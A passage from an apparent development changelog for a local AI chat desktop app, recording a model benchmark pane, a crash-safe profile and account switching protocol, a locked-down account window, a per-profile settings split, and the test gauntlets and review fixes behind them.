  under test shows its step ("writing, 143 of 256 tokens") and a 2px
  breathing bar. A skip or failure shows its note. Two small selects
  pick the run and the one to compare with (same test only). The foot
  line: "Speeds are tokens a second. MLX is timed by the app; Ollama
  reports its own. Memory is the rise in memory in use while the model
  loaded and wrote.", then what was reloaded. A refused start's line
  shows once. `/api/stats` gives memory in GB as sold (2^30), so the
  Settings rail says 48 GB like the benchmark, not 52 (its only reader
  is the rail's spec list). No dead space:
  the section ends at its last line, and the Usage pane scrolls in the
  card's body as before.
- Dev-only hooks: `bench-fake` (a stand-in engine with known timings:
  Llama 3.2 1B MLX-shaped at 40.0 tok/s, 2,000 reading, 0.5 s first
  token, 2.0 s load; Llama 3.2 3B Ollama-shaped at 50.0, 4,000, 0.3 s,
  1.5 s; GPT-OSS 120B skipped), `bench-pace=<s>` (its wait per token, so
  Stop can land) and `bench-only=<label>` (one model, for a real run in
  a dev copy).
- Gauntlet (19 new): the figures from known timings (MLX, a cached
  prompt, Ollama's own, a cut stream, junk values); memory rise and both
  flags on Mac- and PC-shaped samples; the skip notes and the MLX and
  Ollama engines' own skips; the plan (installed only, a partial
  download out, smallest first, the loaded engine last, the one-model
  hook); a whole run on recording stand-ins (a failure and a skip noted,
  the prior engine kept, the rest stopped, the run saved without its
  live fields); the gate both ways; Stop under a second; the file (0600,
  torn and stray lines, newest first, trimming, no temp left); the real
  MLX and Ollama code against stub servers with every `connect`
  recorded (only 127.0.0.1, offline spawn, the fixed test and its
  parameters sent, the figures through, a far address refused before
  connecting); source pins where it meets the app; the profile lints,
  with the writer and the state each shown required; live on a copy of
  its own with `bench-fake` (routes 403 without the key or token, the
  known figures, a second start and a chat refused with the question
  unsaved, Stop mid-model, both runs in a 0600 benchmarks.jsonl read
  back after a restart); the pane's markup, and its rows and formats in
  node. 29 mutations of the protections (the formulas, the flags, the
  skip rules, the order, the gate, Stop, the loopback guard, the offline
  spawn, the sampling parameters, the file, the chat's hold and release,
  the janitor) each fail at least one check.
- Measured here (M4 Pro, 48 GB, 20-core GPU; a dev copy on 9903 with
  `bench-only=Llama 3.2 1B`, no other engine running), two runs a
  minute apart: writes 249.6 and 250.9 tok/s (256 tokens), reads 2,374
  and 2,976 tok/s (1,018 prompt tokens, 30 of them the chat template's
  prefix cached by the one-token load answer), first token 0.42 and
  0.33 s, load 3.6 and 2.0 s (the second from a warm file cache),
  memory +1.8 and +2.0 GB, no pressure, no swap. About 5 s a run for
  this model. The engine was stopped after each run (nothing was loaded
  before), and its log shows only the two local requests. A third run
  after the review fixes, with other agents' gauntlets busy on the same
  Mac: 238.0 tok/s (−5.1%, shown red), reads 2,774, first token
  0.36 s, load 4.0 s, +2.2 GB. So 3% separates a quiet machine's runs,
  not a busy one's.
- Not verified: Ollama's timings on a real engine (this Mac runs its
  models on MLX; the Ollama path ran against a stub that speaks its
  shapes), Windows and NVIDIA (the hardware line's PC branch, the swap
  rule from the page file, `/api/ps`'s GPU share), the pane in
  WKWebView, WebView2 and Qt (checked in Blink), a whole run over every
  installed model (one model was run for real, to leave the other
  engines alone).
- **The re-verify** found two things the fixes made: `regenerate()`
  awaited the benchmark check before anything set `generating`, so Try
  again clicked twice within the round trip rewound the chat one turn
  deeper (to_len 0 on [q0, a0, q1, a1]); and a funnel pick refused by a
  run's 409 abandoned the funnel. Now send(), regenerate() and a funnel
  pick each take a flag before their first await and look at
  `generating` again after it (send's check moved to its top, so a
  funnel's typed answer or goal isn't cleared during a run either); a
  pick asks /api/bench/running before it changes anything; and a 409
  on a stage takes the pick back off the page's copy, keeps the funnel,
  and offers "Send again". The double click is reproduced in node.
- **Two reviews** (numbers and privacy; regressions), fixed in two
  follow-up commits: every item above marked with a review, each with a
  check and a mutation. Ollama's `think: false` (optional in the
  review) is not sent: the app found Ollama rejects "think" for models
  that don't think (OLLAMA_THINK_OFF).
- **Patrick:** nothing to do. Worth a look: whether chats should wait
  for the run instead of being refused.

## 6b330 — switching, the boot invariant and the account window (accounts step 9)
The spec's 1a 5.1, 5.8, 5.9 and 5.11-5.13 with §8 steps 5-6 and 8 (not
7, sharing): M9 of the sign-in plan, and the items 6b329 left for it.
Profiles could be switched only by a test hook's bare switch; now a
sign-in, a sign-out, a sign-out by the server and an Erase each run a
fixed protocol that a crash at any step can't break, a start puts
accounts/ back in order, and account actions get a window of their own.
There are still no real accounts: the keyring is a local test profile's
until M10, and the server steps are no-ops until M11-M14. Everything
here is behind ACCOUNTS, which is on in dev and test copies only: the
app a person opens runs none of it and shows nothing new.
- **accounts/ (1a 5.1).** `accounts/<32 hex>/` holds account.key (0600),
  `.owner`, the stores, sync/state.json and the media folders. Beside it
  only `.new-*` (a sign-in being built) and `.trash-*` (an erase under
  way). Root's originals an Add moved are staged in `imports/<dir>/` in
  the data folder, outside accounts/ and its Time Machine exclusion, so
  backups keep them (second review, F6). `.owner` is
  HMAC(HKDF-SHA256(rid_key, "cai2/owner"), acct_id|dir), stdlib
  (`_hkdf_sha256`, RFC 5869's first vector checked). In this build only
  a local test profile's key gives K_owner (a stand-in rid_key derived
  from its acct_id, so the same test account signing in again finds a
  folder that verifies), and only with the profiles hook; `owner_check`
  answers True, False (a well-formed one that is another account's, or
  none at all) or None (this build can't tell: a real key, one
  re-keying, one it can't read, an `.owner` that isn't 64 hex). M8's
  test profiles get a keyring and `.owner` too.
- **Every delete goes through the trash.** `_erase_folder` is the only
  way anything under accounts/ or imports/ is removed, always under
  run/profile.lock: only a layout name directly in one of them, never a
  link or a Windows junction (any reparse point), its real path exactly
  that, checked again just before each rename; account.key is renamed into a fresh
  `.trash-<rand>/` first, then the folder beside it, then the trash is
  removed. A crash leaves at most a `.trash-*`, which the next start
  empties; a file Windows holds stays there until then. A cloud.json
  that must go (below) is renamed into a trash the same way.
- **The boot invariant (1a 5.11),** first in boot, by the copy holding
  the instance lock only, under run/profile.lock: only the folders
  profile.json names (active or kept) stay in accounts/, and in imports/
  theirs and those on the `putback` list.
  - profile.json missing, unreadable, malformed, or with no `active` at
    all: nothing of anyone's is deleted; the trash is emptied and a
    `.new-*` holding nobody's data goes (so no one is left stuck), and an
    `imports/<dir>` whose account folder is gone joins the `putback` list
    when the record can be written.
  - A named folder whose `.owner` fails is erased; one it can't check is
    left and not opened. A kept folder past `erase_after` is erased. The
    active folder with no account.key becomes kept (cause key-missing).
  - Every other 32-hex folder and `.new-*` in accounts/ is erased,
    except a `.new-*` (or folder) whose key is marked `signup: "sent"` or
    holds `rekey_pending` (1c Q2), or a `.new-*` whose key this build
    can't read (it might be one). Names that aren't the layout's (a
    stray file, a link) are left alone.
  - **Staged units are erased only by a person (second review, F2).** In
    imports/, a folder on the `erase` list (the person's "Erase them" or
    "Erase and continue", recorded in the commit) is erased and leaves the
    list; any other one nobody names joins the `putback` list if it holds
    a unit and is erased only if it holds none. A readable but stale
    profile.json (a restore), or the test hook's bare switch, used to
    erase the Add's units with the account folder; now they come back
    into root.
  - A kept folder's synced keys are erased again at every start (a crash
    can fall between the kept commit and that erase).
  - profile.json is written before the erase it allows, everywhere, so
    a crash between them is finished by the next start.
  - **A lost record stays safe.** profile.json rewritten without
    `active` (deleted by a person or a cleaner) while accounts/ holds
    folders would read as "This computer only" at the second start and
    erase them. A record with no `active` is distrusted; `profile_resume`
    makes a single account folder (with at most its own imports/<dir>)
    kept, cause record-lost, which sign-in step 2 and Erase then offer;
    anything else (two folders, a marked `.new-*`)
    leaves `active` unwritten, no bare switch writes it
    (`_profile_fields`), the invariant deletes nothing, and a sign-in
    refuses ("undecided") until a person decides. **The two-folder case
    waits for M15's decide screen**; until then those folders stay,
    untouched. This rule runs in every build, the shipped app's included
    (second review: fine, it only ever keeps, and there accounts/ never
    exists); the gauntlet's "nothing new runs" pin names it.
  - **A folder the invariant drops sends its Add back.** When it erases
    a folder (a failed `.owner`, a removed or deleted account past its 7
    days, an active folder that vanished) whose `imports/<dir>` still
    holds units (root's originals, not yet uploaded), `putback` gains
    that dir in the same commit and the pending step returns them to
    root: only a person erases unsent work (I12).
  - Boot order: the invariant, "This computer" active, a pending Add
    step 6 (only for a folder this build can open, F7) or put-back
    (`profile_boot_pending`, through root's ctx), M5's
    migration and downgrade import, then the profile profile.json names.
- **Switching.** `_switch_lock` is re-entrant; the protocol holds it
  throughout (`_switching`), and a request that arrives meanwhile waits
  at its start (`switch_wait`, up to 60 s) and then works for the profile
  the switch left active; one that outlasts the wait gets 503 ("The
  profile is changing. Try again in a moment."), never the switch's
  hold. Every step that moves the epoch is M8's bare
  switch, which now first keeps the old profile's answers still
  streaming as far as they got, in their own chat (as a quit keeps them;
  the review of 6b329), then stops read-aloud, makes deletes final and
  cancels the old ctx; afterwards every account window but the one
  running the switch closes, and a switch to another folder cleans the
  web store and reloads the main window (second review, S1: it stopped
  showing the old profile's chats only at its next call's 409, which
  stays as the backstop). A request takes its profile with `switch_ctx`:
  the wait and the read are made atomic by reading again when a switch
  began in between (S4). The lock for switching (sign-in step 0, sign-out step 3) is
  `_hold`: the same profile under a new epoch only the switch holds.
- **Sign-in, steps 0-7** (`profile_signin`; test profiles only until
  M10): flush and hold; the test keyring (step 1); an account folder
  already here (step 2): the same account whose `.owner` verifies
  resumes, a deleted one stops ("never resumes"), anything else needs
  "erase and continue" (an Add of that folder's cut short is finished
  first; then the commit, recording the choice on the `erase` list, then
  the erase, key first, with its imports/<dir>); only a folder profile.json names is ever offered or
  erased; `.new-*` built with account.key, `.owner` and
  sync/state.json (step 3); Add (step 4); the rename to `<dir>`, then
  profile.json `{active, pending_import}` (step 5: a folder profile.json
  doesn't name is erased at the next start; the rename is fsynced
  first); root's originals staged
  (step 6; a failure is finished at the next start); the switch (step 7).
  Closing the account window before the commit cancels it (S3: the
  window's `cancel` Event, checked before steps 5 and 7); what it had
  built is undone (`.new-*` erased; `signin.undo.*` in the crash matrix).
- **Add (1a 5.11 step 4, 6), for chats and memory:** nothing is ticked
  by default. Chats move with fresh ids, each recording `root_id`; the
  pictures, clips and exports their messages show move with their
  `.render.json` and `.meta` (hard-linked into `.new-*` when step 6
  moves root's copy away, copied when a chat root keeps still shows it,
  so no two live profiles share a file); memory facts move; name, persona and home area go
  to sync/state.json `pending_settings`, never personal.json. Step 6 moves
  the originals into `imports/<dir>/` in units (`units.json`:
  `{"v": 1, "units": {uid: {"kind", ...}}}`, a kind this build doesn't
  know kept as it is for 1h). In this order (second review, F1): the
  units; the legacy entries to `legacy/` with the root id each maps to;
  root's chats rewritten without them (the moved ids join `gone`) with
  chats.json and legacy_base following; the facts likewise; and only
  THEN the media, each only when no chat root keeps shows it (compared
  without case on a Mac or a PC, F9; a picture a chat left in root still
  shows stays in root), fsynced. The first cut moved the media first, so
  a step 6 cut short could leave a chat in root with its pictures staged,
  and "Erase them" then deleted them. A media path from data (a chat, the
  manifest, a unit map) must be `(images|videos|exports)/[\w-]+.<ext>`
  (F8: `images/../x` passed a first-part check). Name, persona and home
  area are deleted from root, not staged; then `pending_import` clears.
  A step 6 cut short is never abandoned: a start finishes it; a sign-out
  or a kept Erase finishes it first (through an aside root ctx the
  switch alone holds, `_aside_root`) and changes nothing if it can't
  (`add-unfinished`); a server sign-out keeps it owed; a unit whose chat
  or fact root still holds isn't counted on the sheet.
  Every part re-runs safely: a start after a crash finishes it and never
  imports twice. Remote's target and host keys, cloud keys and Workspace
  never move (their Add boxes are M16's).
- **Sign-out, steps 1-9** (`profile_signout`, run from the account
  window's `/api/account/signout`): the sheet's data (`signout_info`: answers
  streaming, pending settings, media counts, the Add left, kit_saved);
  with an Add not finished uploading, nothing happens without the answer
  (`imported`: putback or erase; no default). Then hold, commit
  (profile.json `active: "local"`, and the dir added to the `putback`
  list or, for "Erase them", the `erase` list: lists, so a put-back left
  pending, say by a file Windows holds, is never replaced by the next,
  and a crash after the choice still finishes it), the switch,
  the erase (key first, through the trash), and the units put back
  (`_putback`: each chat under its own root id and out of `gone`, its
  media, the facts, the legacy entries back into chats.json and
  memory.json with legacy_base; the write evicts nothing and the facts
  merge by time, so the caps never take the chats back out or trim
  root's newer facts, F3; a unit of an unknown kind stays, and so does
  its `putback` entry) or erased. Name, persona and home area never
  come back (the spec's rule: their originals were deleted at Add).
- **`/api/logout` is the desktop sign-out's door:** in a build without
  accounts, or on "This computer", it answers ok as before; signed in,
  it opens the account window at the sign-out sheet (a headless session
  in a windowless copy) and signs nothing out itself: the main window may
  ask for that window, never call an account action (1a 5.9).
- **The kept state** (`profile_keep`: "signed-out" with a cause,
  "removed", "deleted"; the profiles hook until 1d): streams kept through
  the account's ctx; an Add's step 6 cut short finished or left owed;
  commit `{active: "local", kept: {dir, reason, cause, erase_after}}`
  (erase_after 7 days out for removed or deleted), THEN every synced key
  and the `account` section of its cloud.json go (every key for removed
  or deleted), written straight into the kept folder; a start does it
  again (F10: the first cut erased the keys before the commit). A kept folder is
  never opened or served. `profile_kept_erase` is its Erase, with the
  same question when an Add is left.
- **Time Machine (1a 5.8):** `_accounts_prepare` makes accounts/ 0700 and
  runs a sticky `tmutil addexclusion` on it before anything is written
  into it, once a run, macOS only; a failure only logs. A dev or test
  copy never runs tmutil: it records the command, and what accounts/ held
  (nothing), in run/tmutil.jsonl.
- **The web store at a switch (1a 5.12).** 0b's routine with everything
  but LocalStorage and cookies: WebView2 (x64) clears at once on its UI
  thread; Qt (ARM64) marks the first pass due, so the next start removes
  the files before the window, and clears its HTTP cache now. **macOS:
  nothing native.** 6b324's reason stands: the app runs as the venv's
  python3, so WebKit's default store is Python's own
  (`org.python.python`), shared with every pywebview app that Python
  runs; this build doesn't give the window a store of its own
  (`dataStoreForIdentifier`, macOS 14+) because pywebview 6.2.1's Cocoa
  backend always uses the default store, and replacing it means patching
  its window creation. What holds on a Mac: the page keeps nothing
  personal in browser storage (0b), its allow-list sweep runs at every
  boot, so after the reload a switch ends in, and an account's page
  neither posts, uses nor removes the six keys builds before 6b324 left
  (`storeBoot`: they were "This computer"'s; they stay for its next
  boot); and an account's page neither reads nor writes root's
  single-model pick in browser storage (S2: a later root boot could
  adopt it). The limit: other sites' data (the map's tiles) and caches
  in Python's store are not cleaned at a switch on a Mac. The security
  review suggested removing just the records of the app's own
  third-party hosts (OpenFreeMap, OpenStreetMap, Google Fonts) from the
  default store; left out, because another pywebview app on the same
  Python can hold records for the same hosts, and there is no way to
  tell whose they are (S5).
- **/api/prefs/adopt takes nothing into an account** (the review of
  6b329): a page drawn for A posting A's leftover browser keys after the
  switch can't put them in B's local.json.
- **The account window (1a 5.9).** A second `create_window` at `/account`
  with its own one-time boot code (`/account?boot=`) and its own token,
  bound to the profile's tag at open, handed over by its own js_api
  (`_AccountBridge`: `account_token()` only while it shows this app's
  /account, and `account_close()`). `/account`, `/account.css` and
  `/account.js` open with the cookie alone, each under `default-src
  'self'; img-src 'self'; form-action 'none'; base-uri 'none';
  frame-ancestors 'none'; object-src 'none'`; the page has no inline
  script or style and no form, builds every string with textContent, and
  its window has `text_select=False`, `setRestorable_(False)` on a Mac,
  the `events.closing` hook (the token dies, whatever was asked is
  cancelled) and closes with the main window. One at a time: opening
  again brings it forward. `/api/account/*` takes only that token, with
  `X-Profile` equal to the tag it was bound to and the active one (a
  moved epoch: 409 and the window closes); the main token is refused
  there and the account token everywhere else. The main window's js_api
  gains `open_account(task)` (the allow-list: create, signin, approve,
  forgot, cancel-reset, kit, password, new-kit, remove, delete, export,
  import, sync-key, signout, status) in a build with accounts only
  (`_WindowBridgeAcct`; the shipped window keeps the one-method bridge).
  - **The CSP refuses eval, and pywebview uses it:** its api.js builds
    each js_api function with `new Function`, and every reply comes back
    through `evaluate_js`, which wraps the script in `eval()`. So the
    account page calls the bridge through pywebview's own plumbing
    (`_checkValue`, `_jsApiCallback`; on Qt it makes the QWebChannel
    itself), and `_bridge_guard` answers `account_token` and
    `account_close` with `window.run_js` (no wrapper), on a thread of its
    own: on a Mac the bridge arrives on the UI thread, and asking a
    window its URL there (to check it shows /account) waits on that same
    thread for good (the review's catch). The token goes only to the
    calling window when it is the account window. The guard now
    allows, besides `api_token`, `open_account` with one allow-listed
    task on the main window's bridge and those two on the account
    window's, only with ACCOUNTS.
  - The screens are 1e's. The window says which task it opened for and
    that the screens aren't in this build, with a Close button. In a dev
    copy Settings › Account shows "Open the account window" (the shipped
    /api/me has no `window` flag, so the shipped pane draws nothing), and
    the `account-open=<task>` hook opens it once the main window loads.
- **Test hooks (dev copies only):** the profiles hook's ops `signin`
  (with `add`, `acct_id`, `erase_existing`), `signout`, `keep`,
  `kept-erase` and `info`, and a `video` late writer (the Veo landing);
  `account-headless` (`POST /api/test/account`: a session with a token
  bound exactly as a window's); `crash-at=<step>` (`os._exit(86)` at any
  of SWITCH_STEPS' 40 names); `fail-at=<step>` (an OSError there, to
  reach the undo paths); `delay-switch=<s>`; `account-open=<task>`.
- Gauntlet: 437 checks become 466 (29 new). New, in `== accounts step 9 ==`:
  - in process: `.owner` and RFC 5869's first HKDF vector; the erase
    (only layout names, never a link, key first, every delete of a
    `.trash-*`); ISO-12's 16 rules on planted folders (profile.json
    unreadable, missing, malformed or without `active`; a lost record
    kept through restarts and switches; no instance lock; a build that
    can't check `.owner`), with every delete and rename recorded and
    checked to be of or into a `.trash-*`, under run/profile.lock; the
    protocol's 28 rules (Add with its staging, legacy and media, Put them
    back and Erase them, the default moving nothing, a shared picture,
    the kept, removed and deleted states, signing in again, adopt, a live
    answer kept, and the review's four: a lost record refusing a
    sign-in, a pending put-back surviving a lost record, a dropped
    folder's units put back, two put-backs); ISO-13 at each of the 40
    steps, crashed and restarted; the bridge guard and the three bridges
    (the token never to another window); Time Machine (a real app's
    call, a failure, a dev copy's record); the web store per engine;
    storeBoot and the Account pane in node; the shipped app's gates
    pinned; the second review's 16 rules (F1-F4, F7-F10, durability,
    S3, S4); the account page's model pick in node (S2); the main
    window's reload at a switch (S1).
  - 60 in-process mutations, each caught: 15 of the invariant and the
    erase ("a delete without the trash rename", "the invariant without
    the instance lock", "... without run/profile.lock", "an unreadable
    profile.json deletes", "a record without active counts as This
    computer's", a link followed, the key file not first, an unfinished
    sign-up erased, ...) and 45 of the protocol (Add, staging, put back,
    the kept state, resume, adopt, the live-answer flush, the pending
    steps at a start, both reviews' cases). A protection held in more
    than one place is mutated in all of them (the hook's lock on a test
    key; the invariant's lock, also taken by the erase; a link refused by
    the invariant and by the erase; the sign-out's commit order with the
    invariant's two put-backs; the kept keys at the switch and at a
    start).
  - live, on copies: the account page's CSP and its static files; the
    headless session (its token only, the main one refused, X-Profile,
    one at a time, the allow-list, closed by a switch, a new token for
    the one running it); ISO-11's no-server parts; `/api/logout`; Time
    Machine and the web store as recorded; the two-profile A -> B -> A
    canary test; ISO-7 with real sign-ins and sign-outs; ISO-7b; a
    request arriving during a switch; ISO-12 at a real start; ISO-13
    with the real `os._exit` at all 40 steps.
  - adapted: step 8's stream check (the answer is now kept, as far as it
    had streamed, in the profile that asked, and nowhere else); the
    callers lint's list (the protocol's entries and `account_open` may
    ask for the active profile); two of step 8's mutation anchors, one
    of them now a two-site mutation; step 8's usage-at-the-switch case
    no longer races the usage writer; the window's js_api pin; the two
    node storeBoot checks declare PROFILE; ISO-14's cookie-replay list
    opens /account, /account.css and /account.js (and probes their
    neighbours); the media-id count takes the hook's Veo stand-in;
    step 7's /api/me comparisons set the dev copy's `window` flag aside
    (and require it); step 7's pane check stubs the new button.
  - 20 live mutations, run outside the gauntlet (m9work/mutate_live.py:
    each on a copy of the tree, the step-9 section run on it), each
    caught: the account API accepting the main token, the CSP header
    missing, an inline script allowed, the account X-Profile unchecked,
    windows left open at a switch, the running window keeping its old
    token, two windows at once, any task, the web store not cleaned, no
    Time Machine exclusion, requests not held during a switch, the
    headless route without its hook, sign-out without the sheet's
    answer, adopt into an account, /api/logout signing out from the main
    window, the token handed to another window, the main window left on
    the old profile at a switch, an account page writing root's model
    pick, the invariant not run at a start, a pending Add not finished
    at a start.
  - One run of the second review's gauntlet stopped on an IncompleteRead
    of the page at the no-store check (326 KB of 512 read), the same
    flake M5's first run hit at the same place; the rerun was green. Not
    this step's, and not chased here.
- **A review of the first cut** (read-only) found, fixed here: the Mac
  deadlock in the account bridge (above); a sign-in that could erase
  folders a lost record left undecided, and could drop a kept folder
  with the active one; a lost record that didn't count `imports/*`;
  the invariant erasing a dropped folder's Add units; a second put-back
  replacing the first; `/api/logout` signing out from the main window's
  token; a request served under the switch's hold after the wait; media
  linked between two live profiles; an account page deleting root's
  leftover browser keys; a start that could stop on the invariant; short
  rename waits on Windows; the account routes answering nothing on an
  OSError; a test switch's erase undoing the switch. It found nothing
  that changes the app a person opens.
- **Second review** (three reviews of 13b7020: regressions and security
  said ship, erase safety said fix first), fixed in the commit after it,
  each with a check and a mutation: F1, the step-6 order and the sheet's
  count (above); F2, staged units erased only by a recorded choice, and
  put back when nobody names them; F3, a put-back that evicts nothing and
  merges facts by time; F4, a lost record no longer leaves a stray
  `.new-*` or the trash, and puts back units whose account is gone; F6,
  the staging moved out of accounts/ into imports/ so backups keep root's
  originals; F7, a pending step 6 only for a folder this build can open;
  F8, media paths from data checked whole; F9, media names compared
  without case on a Mac or a PC; F10, a damaged `.owner` kept, and kept
  committed before its keys go; junctions and a real path checked before
  every rename; the crash matrix grown from 31 to 40 steps (`boot.key`,
  `signin.2.imported.renamed`, `signin.undo.key` and `.renamed`,
  `signin.6.media`, `signout.8.imported.renamed`, `putback.chats`,
  `putback.renamed`, `kept-erase.imported.renamed`, and `kept.keys` in
  place of `kept.3`); the account's rename and the staged media fsynced;
  S1-S4 (the main window's reload, the model pick, the window's cancel,
  the atomic read). S5 left, with its reason (above).
- **Not fixed, a blocker for M15 (F5):** the sign-out sheet's `unsent` is
  always 0, since nothing tracks unsent changes until 1d; M15 must not
  offer sign-out on that number.
- Checked by hand, windowed on this Mac (a dev copy on 9895 with the
  account-open hook): the account window opened after the main one, its
  page got its token through the eval-free bridge under the strict CSP
  and made its account call; a second open brought it forward; a
  profile switch closed it and killed its token.
- Not verified here: Windows (the renames into `.trash-*` over a file
  an antivirus or WebView2 holds; the account window on WebView2 and
  Qt); ISO-10's windowed byte-grep of the web store after a switch;
  the real `tmutil` (only its recorded argv is checked).
- Deferred, and why: the real keyring, `.owner`'s K_owner from it, and
  writing the new token and device_id into account.key on a resume (M10,
  1c); every server step (1b, 1d: final upload, /v2/logout, /v2/devices,
  the only-signed-in-computer line); the sheets themselves and the Export
  offers at step 2 and on a kept folder, with their save dialogs, and the
  headless dialog-answer hooks (1e's screens, M15-M16); the cloud keys,
  Remote and Workspace Add boxes (M16, Q11); sharing's stop points (1g);
  a way to decide folders a lost record left (a sign-in refuses until
  then; none can occur without a person or a cleaner removing
  profile.json); a per-window WebKit store on the Mac.
- Left by the re-review (all later, M13-M15), with repros in
  scratchpad/m9rev/v2: (1) put-back's `evict=False` only defers the cap to
  the next write (s2), and put-back facts are trimmed at once; mark
  put-back chats exempt until touched, or keep the unit until the chat
  survives a write, or have the sheet count what the cap drops; (2) an
  owed step 6 for a KEPT folder later pulls chats the person kept using
  on This computer into imports/ (s7, nothing lost, but hidden): cancel
  the owed step 6 and put back what was staged instead; (3) a step 6 that
  always fails (EXDEV from a linked images/) leaves sign-out answering
  add-unfinished forever: fall back to copy, fsync, unlink on EXDEV;
  (4) a build that can't handle a unit kind (pre-1h seeing project
  units) can't finish an orphan put-back, which keeps sign-in undecided.
- **Patrick:** nothing for the app a person opens (it is unchanged). The
  windowed account window on Windows x64 (WebView2) and ARM64 (Qt) is
  run in the VM with m9work/account_window_check.py (scratchpad): the
  page must get its token and call (calls >= 1), a second open must
  bring the same window forward, a switch must close it, and the close
  box and the main window's close must end it; plus ISO-10's byte-grep
  of `%MILLENAI_HOME%\webkit` for a canary after a sign-in and sign-out.

## 6b329 — profiles core (accounts step 8)
The spec's 1a 5.2-5.7, §8 steps 1-4 and the X-Profile half of step 5: M8
of the sign-in plan. Before this every personal file sat at a fixed place
in the data folder and every cache and thread read "the" settings, so the
first account would have shared chats, memory, keys, pictures and caches
with "This computer". Now one profile is active per process, every
personal read and write goes through that profile's ctx, and a write made
for a profile that is no longer active lands nowhere. "This computer"
behaves as before: its files, their names and their shapes are unchanged
(prefs.json keeps every setting, as it did), and nothing a person sees
changes. Accounts, the switch protocol and the account window are M9.
- **The profile section** (`# ==== profile: begin/end ====`), the only
  code that writes a personal file:
  - `ProfileCtx{epoch, kind, dir, name, acct_id, cancel}`: "This computer"
    (kind `local`, the data folder) or a local test profile (kind `test`,
    `accounts/<32 hex>/`). The epoch is 64 random bits per activation;
    `tag` is `<local|dir>.<epoch>`.
  - `_PROFILE` holds the active ctx under `_profile_lock` (the store's
    existing innermost RLock) plus a flock on `run/profile.lock`
    (`msvcrt.locking` on Windows), taken by every profile write and every
    switch, once per outermost write.
  - `ctx.read`, `write`, `write_bytes`, `update_json` (read, change and
    write in one lock), `append` (the logs), `adopt` (a file made in run/
    moved in whole) and `remove`. Each holds the lock and the flock from
    the epoch check to the rename, so a switch can't land between them. A
    stale epoch raises `StaleProfile` (an OSError: every writer that
    already treats a failed write as "not saved" drops it the same way),
    writes nothing and is counted. A write never makes the profile's own
    folder, only a subfolder of one that exists, so a late write for an
    erased profile can't bring it back.
  - `_pfile(name, base)` takes a ctx or `MACHINE_ROOT` (the machine's own
    files in the data folder); a missing base raises `NoProfile` instead
    of meaning "the data folder", which is how a write would reach the
    wrong profile.
  - `current_ctx()` is asked only by a request's start
    (`StudioHandler._run`, which binds the ctx to its thread as
    `self.ctx`), the boot, the switch, the test hooks, the quit's flush
    and the janitor's export sweep (each removal epoch-checked).
    Everything else uses the ctx it was given, or `bound_ctx()`: the ctx
    of the request, or of whoever started the thread. `ctx_thread` and
    `ctx_timer` are the only way the file starts a thread (31 sites), and
    `ctx_executor` the only thread pool (the closure check's, whose
    workers now carry the request's ctx; the first cut had a bare
    ThreadPoolExecutor there, which this entry wrongly left out); a
    thread with no ctx has none, and reads no keys and no settings.
- **profile.json** gains 1a's fields beside M5's (`legacy_base`,
  `written`, `migrated_61`, `webstore` are left exactly as they are):
  `active` ("local" or the folder's name), `kept` (null), `epoch` and
  `pending_import` (false). At every start the copy holding the instance
  lock records the root files that exist in `written` (each has been
  written; a lost profile.json no longer makes one read as empty), then
  "This computer" is made active, `_migrate_61` runs through its ctx (the
  boot order is root's, I7), then `profile_resume`. An account folder
  keeps its first-write record in `sync/state.json`. A name this build
  can't open (an account a later build made) is left in profile.json and
  "This computer" runs.
- **The settings split (5.6).** `SYNCED_SETTINGS` (user_name, persona,
  length, home_area, funnel_effort, polish), `PROFILE_LOCAL` (turbo, tier,
  model, council, agent, codeagent, adv, advon, remote_autonomy, workspace,
  the Veo counters and cap, lend, lend_pick, `studio_opts.*.neg`) and
  `MACHINE` (app_models, model_offers, no_limits, include_giants,
  auto_cleanup, the Studio's tier picks and fields, the update keys,
  wizard_done, and the `studio_`, `last_`, `seen_`, `remind_`, retired
  `contrib_`/`fleet_` families). "This computer" keeps all three in
  prefs.json; an account keeps the first in personal.json and the second
  in local.json, and reads the machine's from prefs.json.
  - Read through `machine_prefs()`, `user_prefs(ctx)` or
    `profile_local(ctx)`; each hands back only its set's keys, and reading
    another set's key through it raises `PrefScopeError`, so a missorted
    reader is loud instead of quietly getting None where it used to get a
    value. Written through `machine_prefs_update(fn)`,
    `user_prefs_update(ctx, fn)` and `profile_local_update(ctx, fn)`: only
    that set's keys change, the rest of the file is written back as read,
    and a file that can't be read is left alone (503).
  - All 35 `load_prefs` and 15 `store_prefs` call sites are sorted:
    home_area (5 readers, now `home_area()`), polish, persona, name and
    length read the asking profile's; turbo, workspace, the Veo counters,
    the six per-person keys (`/api/prefs/adopt`) and Forget's settings
    scope are the profile's own; the models, updates, studios and the
    version record are the machine's.
  - `POST /api/prefs` is `split_prefs`: each key to its own place, only
    keys whose value changes are written (`changed` lists them), and with
    `_old` ({key: the value the page last saw}) a key changed underneath
    is a conflict and isn't written. A key no set names, and a synced
    value outside its allowed set (`SYNCED_ALLOWED`: text up to the page's
    own lengths, length 1-5, funnel_effort fast/normal, polish a bool), is
    ignored and listed. The page needs no change: it already sends only
    what changed. GET is the whole prefs.json for "This computer", as
    before, and the three merged for an account.
  - The Studio's negative prompt is split by field (G1):
    `studio_save_opts` writes `neg` to the profile and the other fields to
    the machine, and `studio_prefs` reads each from its own place, so B's
    renders never use A's text.
- **Per-profile files (5.5, 5.7).** Pictures, videos and exports are
  `image_dir(ctx)`, `video_dir(ctx)` and `export_dir(ctx)`, and the routes
  serve only the active profile's. A render, a converted clip and an
  export are made in `run/` (`stage_path`, swept at the next start like
  the other run files) and moved in with `ctx.adopt`, with the render's
  `.render.json`; Gemini pictures and Veo clips go through
  `ctx.write_bytes`. cloud.json (readers keep every field they don't use),
  remote.json and remote_known_hosts resolve through the thread's ctx
  (`_cloud_file`, `remote_conf`, `_known_hosts_path`); cloud.json's lock
  file moved to `run/cloud.lock`, so nothing but a profile's own files is
  made in its folder. quality.jsonl is appended through the asking
  profile's ctx. **usage.jsonl (6b325) is per profile too**: each record
  carries the ctx of the thread that made the model call, the writer
  appends each profile's records to its own ledger, and records for a
  profile that isn't active any more (or for none) are dropped;
  `/api/usage` reads the active profile's.
- **Caches (5.4).** A module-level container that holds anything personal
  is declared where it is made with `profile_cache(name, obj, reset)` and
  emptied at every switch: the plan's list (`_dead_models`, `_dead_when`,
  `_model_rest`, `_repaired`, `_answered`, `_last_cloud`, `_bal_cache`,
  `_search_cache`, `_results_cache`, `_geo_cache`, `_OSM_CACHE`,
  `_TZ_CACHE`, `_HOME_TZ`, `_remote_jobs`, `_hurry_jobs`) and, beyond it:
  `_tl_search` (also reset at each request, 0b), `_SSH_CHANGED` (the host
